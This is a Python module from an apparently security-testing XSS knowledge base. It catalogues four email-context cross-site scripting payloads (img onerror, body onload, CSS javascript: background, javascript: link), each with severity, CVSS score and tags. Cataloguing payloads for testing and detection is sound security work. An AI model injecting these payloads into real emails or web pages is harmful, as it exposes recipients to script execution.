#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Email Context XSS Payloads
"""

from ..models import PayloadEntry


EMAIL_XSS_PAYLOADS = {
    "email_1": PayloadEntry(
        payload="<img src='x' onerror='alert(1)'>",
        contexts=["html_content", "email"],
        severity="high",
        cvss_score=7.0,
        description="Email HTML img onerror",
        tags=["email", "html", "img"],
        reliability="low",
    ),
    "email_2": PayloadEntry(
        payload="<body onload=alert(1)>",
        contexts=["html_content", "email"],
        severity="high",
        cvss_score=7.0,
        description="Email body onload",
        tags=["email", "html", "body"],
        reliability="low",
    ),
    "email_3": PayloadEntry(
        payload="<style>body{background:url('javascript:alert(1)')}</style>",
        contexts=["html_content", "email"],
        severity="high",
        cvss_score=7.0,
        description="Email CSS background javascript",
        tags=["email", "css", "background"],
        reliability="low",
    ),
    "email_4": PayloadEntry(
        payload="<a href='javascript:alert(1)'>Click here</a>",
        contexts=["html_content", "email"],
        severity="high",
        cvss_score=7.5,
        description="Email javascript link",
        tags=["email", "link", "javascript"],
        reliability="low",
    ),
}

EMAIL_XSS_PAYLOADS_TOTAL = len(EMAIL_XSS_PAYLOADS)
